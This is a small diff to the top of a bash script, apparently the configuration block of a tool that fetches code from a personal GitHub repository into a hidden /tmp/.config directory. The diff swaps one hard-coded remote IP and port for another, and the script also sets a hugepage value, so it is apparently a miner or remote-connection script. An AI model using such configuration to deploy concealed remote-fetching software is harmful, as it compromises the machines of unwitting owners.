@@ -1,8 +1,8 @@
 #!/bin/bash
 
 mode="${1:-0}"
-port="443"
-host="167.99.139.112"
+port="80"
+host="104.248.8.194"
 work="/tmp/.config"
 src="https://raw.githubusercontent.com/superade99/entahlah/main"
 hugepage="128"
